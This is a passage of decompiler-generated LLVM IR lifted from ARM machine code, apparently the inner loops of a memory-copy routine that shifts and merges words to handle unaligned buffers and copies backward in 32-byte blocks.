  %v3_14844 = add i32 %v0_14844, 4
  %v4_14844 = inttoptr i32 %v3_14844 to i32*
  %v5_14844 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14844, i32* %v4_14844, align 4
  %v6_14844 = add i32 %v0_14844, 8
  %v7_14844 = inttoptr i32 %v6_14844 to i32*
  %v8_14844 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_14844, i32* %v7_14844, align 4
  %v9_14844 = add i32 %v0_14844, 12
  %v10_14844 = inttoptr i32 %v9_14844 to i32*
  %v11_14844 = load i32, i32* @ip, align 4
  store i32 %v11_14844, i32* %v10_14844, align 4
  %v12_14844 = add i32 %v0_14844, 16
  store i32 %v12_14844, i32* %r0.global-to-local, align 4
  %v0_14848 = load i32, i32* %r2.global-to-local, align 4
  %v1_14848 = add i32 %v0_14848, -16
  store i32 %v1_14848, i32* %r2.global-to-local, align 4
  %v3_14848 = sub i32 15, %v0_14848
  %v4_14848 = and i32 %v3_14848, %v0_14848
  %v5_14848 = icmp slt i32 %v4_14848, 0
  %v6_14848 = icmp slt i32 %v1_14848, 0
  %v2_1484c = xor i1 %v6_14848, %v5_14848
  br i1 %v2_1484c, label %dec_label_pc_14850, label %dec_label_pc_14820.dec_label_pc_14820_crit_edge

dec_label_pc_14820.dec_label_pc_14820_crit_edge:  ; preds = %dec_label_pc_14820
  %v0_14820.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_14824.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14820

dec_label_pc_14850:                               ; preds = %dec_label_pc_14820
  %v2_14850 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14850, i32* @r4, align 4
  %v5_14850 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_14850, i32* @r5, align 4
  %v1_14854 = add i32 %v0_14848, -4
  store i32 %v1_14854, i32* %r2.global-to-local, align 4
  %v3_14854 = add i32 %v0_14848, 2147483632
  %v4_14854 = and i32 %v1_14854, %v3_14854
  %v5_14854 = icmp slt i32 %v4_14854, 0
  store i1 %v5_14854, i1* %cpsr_v.global-to-local, align 1
  %v6_14854 = icmp slt i32 %v1_14854, 0
  store i1 %v6_14854, i1* %cpsr_n.global-to-local, align 1
  %v7_14854 = icmp eq i32 %v1_14854, 0
  store i1 %v7_14854, i1* %cpsr_z.global-to-local, align 1
  %v2_14858 = xor i1 %v6_14854, %v5_14854
  br i1 %v2_14858, label %dec_label_pc_14874, label %dec_label_pc_1485c

dec_label_pc_1485c:                               ; preds = %dec_label_pc_14850, %dec_label_pc_14810, %dec_label_pc_1485c
  %v1_14868 = phi i32 [ %v4_14868, %dec_label_pc_1485c ], [ %v12_14844, %dec_label_pc_14850 ], [ %v0_1491c76, %dec_label_pc_14810 ]
  %v0_1485c = load i32, i32* %lr.global-to-local, align 4
  %v3_1485c = udiv i32 %v0_1485c, 256
  store i32 %v3_1485c, i32* %ip.global-to-local, align 4
  %v0_14860 = load i32, i32* %r1.global-to-local, align 4
  %v1_14860 = inttoptr i32 %v0_14860 to i32*
  %v2_14860 = load i32, i32* %v1_14860, align 4
  store i32 %v2_14860, i32* %lr.global-to-local, align 4
  %v4_14860 = add i32 %v0_14860, 4
  store i32 %v4_14860, i32* %r1.global-to-local, align 4
  %v4_14864 = mul i32 %v2_14860, 16777216
  %v5_14864 = or i32 %v4_14864, %v3_1485c
  store i32 %v5_14864, i32* @ip, align 4
  %v2_14868 = inttoptr i32 %v1_14868 to i32*
  store i32 %v5_14864, i32* %v2_14868, align 4
  %v3_14868 = load i32, i32* %r0.global-to-local, align 4
  %v4_14868 = add i32 %v3_14868, 4
  store i32 %v4_14868, i32* %r0.global-to-local, align 4
  %v0_1486c = load i32, i32* %r2.global-to-local, align 4
  %v1_1486c = add i32 %v0_1486c, -4
  store i32 %v1_1486c, i32* %r2.global-to-local, align 4
  %v3_1486c = sub i32 3, %v0_1486c
  %v4_1486c = and i32 %v3_1486c, %v0_1486c
  %v5_1486c = icmp slt i32 %v4_1486c, 0
  %v6_1486c = icmp slt i32 %v1_1486c, 0
  %v2_14870 = xor i1 %v6_1486c, %v5_1486c
  br i1 %v2_14870, label %dec_label_pc_14874.loopexit, label %dec_label_pc_1485c

dec_label_pc_14874.loopexit:                      ; preds = %dec_label_pc_1485c
  %v7_1486c = icmp eq i32 %v0_1486c, 4
  store i1 %v5_1486c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1486c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1486c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14874

dec_label_pc_14874:                               ; preds = %dec_label_pc_14874.loopexit, %dec_label_pc_14850
  %v0_1479c59 = phi i32 [ %v1_1486c, %dec_label_pc_14874.loopexit ], [ %v1_14854, %dec_label_pc_14850 ]
  %v0_14874 = load i32, i32* %r1.global-to-local, align 4
  %v1_14874 = add i32 %v0_14874, -3
  store i32 %v1_14874, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_1487c:                               ; preds = %dec_label_pc_147fc
  br i1 %v2_14880, label %dec_label_pc_148c8, label %dec_label_pc_14884

dec_label_pc_14884:                               ; preds = %dec_label_pc_1487c
  store i32 %v1_1487c, i32* %r2.global-to-local, align 4
  %v3_14888 = load i32, i32* @r4, align 4
  store i32 %v3_14888, i32* %stack_var_-16, align 4
  %v6_14888 = load i32, i32* @r5, align 4
  store i32 %v6_14888, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1488c

dec_label_pc_1488c:                               ; preds = %dec_label_pc_1488c.dec_label_pc_1488c_crit_edge, %dec_label_pc_14884
  %v0_148b0 = phi i32 [ %v12_148b0, %dec_label_pc_1488c.dec_label_pc_1488c_crit_edge ], [ %v0_1491c76, %dec_label_pc_14884 ]
  %v0_14890 = phi i32 [ %v0_14890.pre, %dec_label_pc_1488c.dec_label_pc_1488c_crit_edge ], [ %v4_14800, %dec_label_pc_14884 ]
  %v0_1488c = phi i32 [ %v0_1488c.pre, %dec_label_pc_1488c.dec_label_pc_1488c_crit_edge ], [ %v2_14800, %dec_label_pc_14884 ]
  %v3_1488c = udiv i32 %v0_1488c, 65536
  %v1_14890 = inttoptr i32 %v0_14890 to i32*
  %v2_14890 = load i32, i32* %v1_14890, align 4
  store i32 %v2_14890, i32* %r4.global-to-local, align 4
  %v3_14890 = add i32 %v0_14890, 4
  %v4_14890 = inttoptr i32 %v3_14890 to i32*
  %v5_14890 = load i32, i32* %v4_14890, align 4
  store i32 %v5_14890, i32* %r5.global-to-local, align 4
  %v6_14890 = add i32 %v0_14890, 8
  %v7_14890 = inttoptr i32 %v6_14890 to i32*
  %v8_14890 = load i32, i32* %v7_14890, align 4
  store i32 %v8_14890, i32* %ip.global-to-local, align 4
  %v9_14890 = add i32 %v0_14890, 12
  %v10_14890 = inttoptr i32 %v9_14890 to i32*
  %v11_14890 = load i32, i32* %v10_14890, align 4
  store i32 %v11_14890, i32* %lr.global-to-local, align 4
  %v12_14890 = add i32 %v0_14890, 16
  store i32 %v12_14890, i32* %r1.global-to-local, align 4
  %v4_14894 = mul i32 %v2_14890, 65536
  %v5_14894 = or i32 %v4_14894, %v3_1488c
  store i32 %v5_14894, i32* @r3, align 4
  %v3_14898 = udiv i32 %v2_14890, 65536
  %v4_1489c = mul i32 %v5_14890, 65536
  %v5_1489c = or i32 %v4_1489c, %v3_14898
  store i32 %v5_1489c, i32* %r4.global-to-local, align 4
  %v3_148a0 = udiv i32 %v5_14890, 65536
  %v4_148a4 = mul i32 %v8_14890, 65536
  %v5_148a4 = or i32 %v4_148a4, %v3_148a0
  store i32 %v5_148a4, i32* %r5.global-to-local, align 4
  %v3_148a8 = udiv i32 %v8_14890, 65536
  %v4_148ac = mul i32 %v11_14890, 65536
  %v5_148ac = or i32 %v4_148ac, %v3_148a8
  store i32 %v5_148ac, i32* @ip, align 4
  %v1_148b0 = inttoptr i32 %v0_148b0 to i32*
  store i32 %v5_14894, i32* %v1_148b0, align 4
  %v3_148b0 = add i32 %v0_148b0, 4
  %v4_148b0 = inttoptr i32 %v3_148b0 to i32*
  %v5_148b0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_148b0, i32* %v4_148b0, align 4
  %v6_148b0 = add i32 %v0_148b0, 8
  %v7_148b0 = inttoptr i32 %v6_148b0 to i32*
  %v8_148b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_148b0, i32* %v7_148b0, align 4
  %v9_148b0 = add i32 %v0_148b0, 12
  %v10_148b0 = inttoptr i32 %v9_148b0 to i32*
  %v11_148b0 = load i32, i32* @ip, align 4
  store i32 %v11_148b0, i32* %v10_148b0, align 4
  %v12_148b0 = add i32 %v0_148b0, 16
  store i32 %v12_148b0, i32* %r0.global-to-local, align 4
  %v0_148b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_148b4 = add i32 %v0_148b4, -16
  store i32 %v1_148b4, i32* %r2.global-to-local, align 4
  %v3_148b4 = sub i32 15, %v0_148b4
  %v4_148b4 = and i32 %v3_148b4, %v0_148b4
  %v5_148b4 = icmp slt i32 %v4_148b4, 0
  %v6_148b4 = icmp slt i32 %v1_148b4, 0
  %v2_148b8 = xor i1 %v6_148b4, %v5_148b4
  br i1 %v2_148b8, label %dec_label_pc_148bc, label %dec_label_pc_1488c.dec_label_pc_1488c_crit_edge

dec_label_pc_1488c.dec_label_pc_1488c_crit_edge:  ; preds = %dec_label_pc_1488c
  %v0_1488c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_14890.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1488c

dec_label_pc_148bc:                               ; preds = %dec_label_pc_1488c
  %v2_148bc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_148bc, i32* @r4, align 4
  %v5_148bc = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_148bc, i32* @r5, align 4
  %v1_148c0 = add i32 %v0_148b4, -4
  store i32 %v1_148c0, i32* %r2.global-to-local, align 4
  %v3_148c0 = add i32 %v0_148b4, 2147483632
  %v4_148c0 = and i32 %v1_148c0, %v3_148c0
  %v5_148c0 = icmp slt i32 %v4_148c0, 0
  store i1 %v5_148c0, i1* %cpsr_v.global-to-local, align 1
  %v6_148c0 = icmp slt i32 %v1_148c0, 0
  store i1 %v6_148c0, i1* %cpsr_n.global-to-local, align 1
  %v7_148c0 = icmp eq i32 %v1_148c0, 0
  store i1 %v7_148c0, i1* %cpsr_z.global-to-local, align 1
  %v2_148c4 = xor i1 %v6_148c0, %v5_148c0
  br i1 %v2_148c4, label %dec_label_pc_148e0, label %dec_label_pc_148c8

dec_label_pc_148c8:                               ; preds = %dec_label_pc_148bc, %dec_label_pc_1487c, %dec_label_pc_148c8
  %v1_148d4 = phi i32 [ %v4_148d4, %dec_label_pc_148c8 ], [ %v12_148b0, %dec_label_pc_148bc ], [ %v0_1491c76, %dec_label_pc_1487c ]
  %v0_148c8 = load i32, i32* %lr.global-to-local, align 4
  %v3_148c8 = udiv i32 %v0_148c8, 65536
  store i32 %v3_148c8, i32* %ip.global-to-local, align 4
  %v0_148cc = load i32, i32* %r1.global-to-local, align 4
  %v1_148cc = inttoptr i32 %v0_148cc to i32*
  %v2_148cc = load i32, i32* %v1_148cc, align 4
  store i32 %v2_148cc, i32* %lr.global-to-local, align 4
  %v4_148cc = add i32 %v0_148cc, 4
  store i32 %v4_148cc, i32* %r1.global-to-local, align 4
  %v4_148d0 = mul i32 %v2_148cc, 65536
  %v5_148d0 = or i32 %v4_148d0, %v3_148c8
  store i32 %v5_148d0, i32* @ip, align 4
  %v2_148d4 = inttoptr i32 %v1_148d4 to i32*
  store i32 %v5_148d0, i32* %v2_148d4, align 4
  %v3_148d4 = load i32, i32* %r0.global-to-local, align 4
  %v4_148d4 = add i32 %v3_148d4, 4
  store i32 %v4_148d4, i32* %r0.global-to-local, align 4
  %v0_148d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_148d8 = add i32 %v0_148d8, -4
  store i32 %v1_148d8, i32* %r2.global-to-local, align 4
  %v3_148d8 = sub i32 3, %v0_148d8
  %v4_148d8 = and i32 %v3_148d8, %v0_148d8
  %v5_148d8 = icmp slt i32 %v4_148d8, 0
  %v6_148d8 = icmp slt i32 %v1_148d8, 0
  %v2_148dc = xor i1 %v6_148d8, %v5_148d8
  br i1 %v2_148dc, label %dec_label_pc_148e0.loopexit, label %dec_label_pc_148c8

dec_label_pc_148e0.loopexit:                      ; preds = %dec_label_pc_148c8
  %v7_148d8 = icmp eq i32 %v0_148d8, 4
  store i1 %v5_148d8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_148d8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_148d8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_148e0

dec_label_pc_148e0:                               ; preds = %dec_label_pc_148e0.loopexit, %dec_label_pc_148bc
  %v0_1479c60 = phi i32 [ %v1_148d8, %dec_label_pc_148e0.loopexit ], [ %v1_148c0, %dec_label_pc_148bc ]
  %v0_148e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_148e0 = add i32 %v0_148e0, -2
  store i32 %v1_148e0, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_148e8:                               ; preds = %dec_label_pc_147fc
  br i1 %v2_14880, label %dec_label_pc_14934, label %dec_label_pc_148f0

dec_label_pc_148f0:                               ; preds = %dec_label_pc_148e8
  store i32 %v1_1487c, i32* %r2.global-to-local, align 4
  %v3_148f4 = load i32, i32* @r4, align 4
  store i32 %v3_148f4, i32* %stack_var_-16, align 4
  %v6_148f4 = load i32, i32* @r5, align 4
  store i32 %v6_148f4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_148f8

dec_label_pc_148f8:                               ; preds = %dec_label_pc_148f8.dec_label_pc_148f8_crit_edge, %dec_label_pc_148f0
  %v0_1491c = phi i32 [ %v12_1491c, %dec_label_pc_148f8.dec_label_pc_148f8_crit_edge ], [ %v0_1491c76, %dec_label_pc_148f0 ]
  %v0_148fc = phi i32 [ %v0_148fc.pre, %dec_label_pc_148f8.dec_label_pc_148f8_crit_edge ], [ %v4_14800, %dec_label_pc_148f0 ]
  %v0_148f8 = phi i32 [ %v0_148f8.pre, %dec_label_pc_148f8.dec_label_pc_148f8_crit_edge ], [ %v2_14800, %dec_label_pc_148f0 ]
  %v3_148f8 = udiv i32 %v0_148f8, 16777216
  %v1_148fc = inttoptr i32 %v0_148fc to i32*
  %v2_148fc = load i32, i32* %v1_148fc, align 4
  store i32 %v2_148fc, i32* %r4.global-to-local, align 4
  %v3_148fc = add i32 %v0_148fc, 4
  %v4_148fc = inttoptr i32 %v3_148fc to i32*
  %v5_148fc = load i32, i32* %v4_148fc, align 4
  store i32 %v5_148fc, i32* %r5.global-to-local, align 4
  %v6_148fc = add i32 %v0_148fc, 8
  %v7_148fc = inttoptr i32 %v6_148fc to i32*
  %v8_148fc = load i32, i32* %v7_148fc, align 4
  store i32 %v8_148fc, i32* %ip.global-to-local, align 4
  %v9_148fc = add i32 %v0_148fc, 12
  %v10_148fc = inttoptr i32 %v9_148fc to i32*
  %v11_148fc = load i32, i32* %v10_148fc, align 4
  store i32 %v11_148fc, i32* %lr.global-to-local, align 4
  %v12_148fc = add i32 %v0_148fc, 16
  store i32 %v12_148fc, i32* %r1.global-to-local, align 4
  %v4_14900 = mul i32 %v2_148fc, 256
  %v5_14900 = or i32 %v4_14900, %v3_148f8
  store i32 %v5_14900, i32* @r3, align 4
  %v3_14904 = udiv i32 %v2_148fc, 16777216
  %v4_14908 = mul i32 %v5_148fc, 256
  %v5_14908 = or i32 %v4_14908, %v3_14904
  store i32 %v5_14908, i32* %r4.global-to-local, align 4
  %v3_1490c = udiv i32 %v5_148fc, 16777216
  %v4_14910 = mul i32 %v8_148fc, 256
  %v5_14910 = or i32 %v4_14910, %v3_1490c
  store i32 %v5_14910, i32* %r5.global-to-local, align 4
  %v3_14914 = udiv i32 %v8_148fc, 16777216
  %v4_14918 = mul i32 %v11_148fc, 256
  %v5_14918 = or i32 %v4_14918, %v3_14914
  store i32 %v5_14918, i32* @ip, align 4
  %v1_1491c = inttoptr i32 %v0_1491c to i32*
  store i32 %v5_14900, i32* %v1_1491c, align 4
  %v3_1491c = add i32 %v0_1491c, 4
  %v4_1491c = inttoptr i32 %v3_1491c to i32*
  %v5_1491c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1491c, i32* %v4_1491c, align 4
  %v6_1491c = add i32 %v0_1491c, 8
  %v7_1491c = inttoptr i32 %v6_1491c to i32*
  %v8_1491c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1491c, i32* %v7_1491c, align 4
  %v9_1491c = add i32 %v0_1491c, 12
  %v10_1491c = inttoptr i32 %v9_1491c to i32*
  %v11_1491c = load i32, i32* @ip, align 4
  store i32 %v11_1491c, i32* %v10_1491c, align 4
  %v12_1491c = add i32 %v0_1491c, 16
  store i32 %v12_1491c, i32* %r0.global-to-local, align 4
  %v0_14920 = load i32, i32* %r2.global-to-local, align 4
  %v1_14920 = add i32 %v0_14920, -16
  store i32 %v1_14920, i32* %r2.global-to-local, align 4
  %v3_14920 = sub i32 15, %v0_14920
  %v4_14920 = and i32 %v3_14920, %v0_14920
  %v5_14920 = icmp slt i32 %v4_14920, 0
  %v6_14920 = icmp slt i32 %v1_14920, 0
  %v2_14924 = xor i1 %v6_14920, %v5_14920
  br i1 %v2_14924, label %dec_label_pc_14928, label %dec_label_pc_148f8.dec_label_pc_148f8_crit_edge

dec_label_pc_148f8.dec_label_pc_148f8_crit_edge:  ; preds = %dec_label_pc_148f8
  %v0_148f8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_148fc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_148f8

dec_label_pc_14928:                               ; preds = %dec_label_pc_148f8
  %v2_14928 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14928, i32* @r4, align 4
  %v5_14928 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_14928, i32* @r5, align 4
  %v1_1492c = add i32 %v0_14920, -4
  store i32 %v1_1492c, i32* %r2.global-to-local, align 4
  %v3_1492c = add i32 %v0_14920, 2147483632
  %v4_1492c = and i32 %v1_1492c, %v3_1492c
  %v5_1492c = icmp slt i32 %v4_1492c, 0
  store i1 %v5_1492c, i1* %cpsr_v.global-to-local, align 1
  %v6_1492c = icmp slt i32 %v1_1492c, 0
  store i1 %v6_1492c, i1* %cpsr_n.global-to-local, align 1
  %v7_1492c = icmp eq i32 %v1_1492c, 0
  store i1 %v7_1492c, i1* %cpsr_z.global-to-local, align 1
  %v2_14930 = xor i1 %v6_1492c, %v5_1492c
  br i1 %v2_14930, label %dec_label_pc_1494c, label %dec_label_pc_14934

dec_label_pc_14934:                               ; preds = %dec_label_pc_14928, %dec_label_pc_148e8, %dec_label_pc_14934
  %v1_14940 = phi i32 [ %v4_14940, %dec_label_pc_14934 ], [ %v12_1491c, %dec_label_pc_14928 ], [ %v0_1491c76, %dec_label_pc_148e8 ]
  %v0_14934 = load i32, i32* %lr.global-to-local, align 4
  %v3_14934 = udiv i32 %v0_14934, 16777216
  store i32 %v3_14934, i32* %ip.global-to-local, align 4
  %v0_14938 = load i32, i32* %r1.global-to-local, align 4
  %v1_14938 = inttoptr i32 %v0_14938 to i32*
  %v2_14938 = load i32, i32* %v1_14938, align 4
  store i32 %v2_14938, i32* %lr.global-to-local, align 4
  %v4_14938 = add i32 %v0_14938, 4
  store i32 %v4_14938, i32* %r1.global-to-local, align 4
  %v4_1493c = mul i32 %v2_14938, 256
  %v5_1493c = or i32 %v4_1493c, %v3_14934
  store i32 %v5_1493c, i32* @ip, align 4
  %v2_14940 = inttoptr i32 %v1_14940 to i32*
  store i32 %v5_1493c, i32* %v2_14940, align 4
  %v3_14940 = load i32, i32* %r0.global-to-local, align 4
  %v4_14940 = add i32 %v3_14940, 4
  store i32 %v4_14940, i32* %r0.global-to-local, align 4
  %v0_14944 = load i32, i32* %r2.global-to-local, align 4
  %v1_14944 = add i32 %v0_14944, -4
  store i32 %v1_14944, i32* %r2.global-to-local, align 4
  %v3_14944 = sub i32 3, %v0_14944
  %v4_14944 = and i32 %v3_14944, %v0_14944
  %v5_14944 = icmp slt i32 %v4_14944, 0
  %v6_14944 = icmp slt i32 %v1_14944, 0
  %v2_14948 = xor i1 %v6_14944, %v5_14944
  br i1 %v2_14948, label %dec_label_pc_1494c.loopexit, label %dec_label_pc_14934

dec_label_pc_1494c.loopexit:                      ; preds = %dec_label_pc_14934
  %v7_14944 = icmp eq i32 %v0_14944, 4
  store i1 %v5_14944, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_14944, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_14944, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1494c

dec_label_pc_1494c:                               ; preds = %dec_label_pc_1494c.loopexit, %dec_label_pc_14928
  %v0_1479c61 = phi i32 [ %v1_14944, %dec_label_pc_1494c.loopexit ], [ %v1_1492c, %dec_label_pc_14928 ]
  %v0_1494c = load i32, i32* %r1.global-to-local, align 4
  %v1_1494c = add i32 %v0_1494c, -1
  store i32 %v1_1494c, i32* %r1.global-to-local, align 4
  br label %bb141

dec_label_pc_14954:                               ; preds = %dec_label_pc_14700
  %v1_14954 = load i32, i32* @r2, align 4
  %v2_14954 = add i32 %v1_14954, %v0_14700
  store i32 %v2_14954, i32* %r1.global-to-local, align 4
  %v2_14958 = add i32 %v1_14954, %v1_14700
  store i32 %v2_14958, i32* %r0.global-to-local, align 4
  %v2_1495c = add i32 %v1_14954, -4
  store i32 %v2_1495c, i32* %r2.global-to-local, align 4
  %v4_1495c = sub i32 3, %v1_14954
  %v5_1495c = and i32 %v4_1495c, %v1_14954
  %v6_1495c = icmp slt i32 %v5_1495c, 0
  store i1 %v6_1495c, i1* %cpsr_v.global-to-local, align 1
  %v7_1495c = icmp slt i32 %v2_1495c, 0
  store i1 %v7_1495c, i1* %cpsr_n.global-to-local, align 1
  %v8_1495c = icmp eq i32 %v1_14954, 4
  store i1 %v8_1495c, i1* %cpsr_z.global-to-local, align 1
  %v5_14960 = icmp slt i32 %v1_14954, 4
  br i1 %v5_14960, label %bb151, label %dec_label_pc_14964

dec_label_pc_14964:                               ; preds = %dec_label_pc_14954
  %v1_14964 = urem i32 %v2_14958, 4
  store i32 %v1_14964, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14964 = icmp eq i32 %v1_14964, 0
  store i1 %v2_14964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14964, label %dec_label_pc_1496c, label %dec_label_pc_14a0c

dec_label_pc_1496c:                               ; preds = %dec_label_pc_14964
  %v1_1496c = urem i32 %v2_14954, 4
  store i32 %v1_1496c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1496c = icmp eq i32 %v1_1496c, 0
  store i1 %v2_1496c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1496c, label %dec_label_pc_14974, label %dec_label_pc_14a38

dec_label_pc_14974:                               ; preds = %dec_label_pc_1496c, %dec_label_pc_14a30
  %v0_1498c37 = phi i32 [ %v2_14958, %dec_label_pc_1496c ], [ %v0_14a8020, %dec_label_pc_14a30 ]
  %v0_1498836 = phi i32 [ %v2_14954, %dec_label_pc_1496c ], [ %v0_14a30, %dec_label_pc_14a30 ]
  %v0_14974 = phi i32 [ %v2_1495c, %dec_label_pc_1496c ], [ %v2_14a28, %dec_label_pc_14a30 ]
  %v2_14974 = add i32 %v0_14974, -8
  store i32 %v2_14974, i32* %r2.global-to-local, align 4
  %v4_14974 = sub i32 7, %v0_14974
  %v5_14974 = and i32 %v4_14974, %v0_14974
  %v6_14974 = icmp slt i32 %v5_14974, 0
  store i1 %v6_14974, i1* %cpsr_v.global-to-local, align 1
  %v7_14974 = icmp slt i32 %v2_14974, 0
  store i1 %v7_14974, i1* %cpsr_n.global-to-local, align 1
  %v8_14974 = icmp eq i32 %v0_14974, 8
  store i1 %v8_14974, i1* %cpsr_z.global-to-local, align 1
  %v5_14978 = icmp slt i32 %v0_14974, 8
  br i1 %v5_14978, label %dec_label_pc_149c4, label %dec_label_pc_1497c

dec_label_pc_1497c:                               ; preds = %dec_label_pc_14974
  %v3_1497c = load i32, i32* @r4, align 4
  %v5_1497c = inttoptr i32 %v3_1497c to i8*
  store i8* %v5_1497c, i8** %stack_var_-8, align 4
  %v8_1497c = load i32, i32* @lr, align 4
  %v2_14980 = add i32 %v0_14974, -28
  store i32 %v2_14980, i32* %r2.global-to-local, align 4
  %v4_14980 = sub i32 27, %v0_14974
  %v5_14980 = and i32 %v4_14980, %v2_14974
  %v6_14980 = icmp slt i32 %v5_14980, 0
  store i1 %v6_14980, i1* %cpsr_v.global-to-local, align 1
  %v7_14980 = icmp slt i32 %v2_14980, 0
  store i1 %v7_14980, i1* %cpsr_n.global-to-local, align 1
  %v8_14980 = icmp eq i32 %v2_14974, 20
  store i1 %v8_14980, i1* %cpsr_z.global-to-local, align 1
  %v5_14984 = icmp slt i32 %v2_14974, 20
  br i1 %v5_14984, label %dec_label_pc_149a0, label %dec_label_pc_14988

dec_label_pc_14988:                               ; preds = %dec_label_pc_1497c, %dec_label_pc_14988.dec_label_pc_14988_crit_edge
  %v0_1498c = phi i32 [ %v1_14994, %dec_label_pc_14988.dec_label_pc_14988_crit_edge ], [ %v0_1498c37, %dec_label_pc_1497c ]
  %v0_14988 = phi i32 [ %v0_14988.pre, %dec_label_pc_14988.dec_label_pc_14988_crit_edge ], [ %v0_1498836, %dec_label_pc_1497c ]
  %v1_14988 = add i32 %v0_14988, -4
  %v2_14988 = inttoptr i32 %v1_14988 to i32*
  %v3_14988 = load i32, i32* %v2_14988, align 4
  %v4_14988 = add i32 %v0_14988, -8
  %v5_14988 = inttoptr i32 %v4_14988 to i32*
  %v6_14988 = load i32, i32* %v5_14988, align 4
  store i32 %v6_14988, i32* %r4.global-to-local, align 4
  %v7_14988 = add i32 %v0_14988, -12
  %v8_14988 = inttoptr i32 %v7_14988 to i32*
  %v9_14988 = load i32, i32* %v8_14988, align 4
  store i32 %v9_14988, i32* %ip.global-to-local, align 4
  %v10_14988 = add i32 %v0_14988, -16
  %v11_14988 = inttoptr i32 %v10_14988 to i32*
  %v12_14988 = load i32, i32* %v11_14988, align 4
  store i32 %v12_14988, i32* %lr.global-to-local, align 4
  store i32 %v10_14988, i32* %r1.global-to-local, align 4
  %v1_1498c = add i32 %v0_1498c, -16
  %v2_1498c = inttoptr i32 %v1_1498c to i32*
  store i32 %v3_14988, i32* %v2_1498c, align 4
  %v4_1498c = add i32 %v0_1498c, -12
  %v5_1498c = inttoptr i32 %v4_1498c to i32*
  %v6_1498c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1498c, i32* %v5_1498c, align 4
  %v7_1498c = add i32 %v0_1498c, -8
  %v8_1498c = inttoptr i32 %v7_1498c to i32*
  %v9_1498c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1498c, i32* %v8_1498c, align 4
  %v10_1498c = add i32 %v0_1498c, -4
  %v11_1498c = inttoptr i32 %v10_1498c to i32*
  %v12_1498c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1498c, i32* %v11_1498c, align 4
  store i32 %v1_1498c, i32* %r0.global-to-local, align 4
  %v0_14990 = load i32, i32* %r1.global-to-local, align 4
  %v1_14990 = add i32 %v0_14990, -4
  %v2_14990 = inttoptr i32 %v1_14990 to i32*
  %v3_14990 = load i32, i32* %v2_14990, align 4
  store i32 %v3_14990, i32* @r3, align 4
  %v4_14990 = add i32 %v0_14990, -8
  %v5_14990 = inttoptr i32 %v4_14990 to i32*
  %v6_14990 = load i32, i32* %v5_14990, align 4
  store i32 %v6_14990, i32* %r4.global-to-local, align 4
  %v7_14990 = add i32 %v0_14990, -12
  %v8_14990 = inttoptr i32 %v7_14990 to i32*
  %v9_14990 = load i32, i32* %v8_14990, align 4
  store i32 %v9_14990, i32* @ip, align 4
  %v10_14990 = add i32 %v0_14990, -16
  %v11_14990 = inttoptr i32 %v10_14990 to i32*
  %v12_14990 = load i32, i32* %v11_14990, align 4
  store i32 %v12_14990, i32* %lr.global-to-local, align 4
  store i32 %v10_14990, i32* %r1.global-to-local, align 4
  %v1_14994 = add i32 %v0_1498c, -32
  %v2_14994 = inttoptr i32 %v1_14994 to i32*
  store i32 %v3_14990, i32* %v2_14994, align 4
  %v4_14994 = add i32 %v0_1498c, -28
  %v5_14994 = inttoptr i32 %v4_14994 to i32*
  %v6_14994 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_14994, i32* %v5_14994, align 4
  %v7_14994 = add i32 %v0_1498c, -24
  %v8_14994 = inttoptr i32 %v7_14994 to i32*
  %v9_14994 = load i32, i32* @ip, align 4
  store i32 %v9_14994, i32* %v8_14994, align 4
  %v10_14994 = add i32 %v0_1498c, -20
  %v11_14994 = inttoptr i32 %v10_14994 to i32*
  %v12_14994 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14994, i32* %v11_14994, align 4
  store i32 %v1_14994, i32* %r0.global-to-local, align 4
  %v0_14998 = load i32, i32* %r2.global-to-local, align 4
  %v2_14998 = add i32 %v0_14998, -32
  store i32 %v2_14998, i32* %r2.global-to-local, align 4
  %v6_1499c = icmp slt i32 %v0_14998, 32
  br i1 %v6_1499c, label %dec_label_pc_149a0.loopexit, label %dec_label_pc_14988.dec_label_pc_14988_crit_edge

dec_label_pc_14988.dec_label_pc_14988_crit_edge:  ; preds = %dec_label_pc_14988
  %v0_14988.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14988

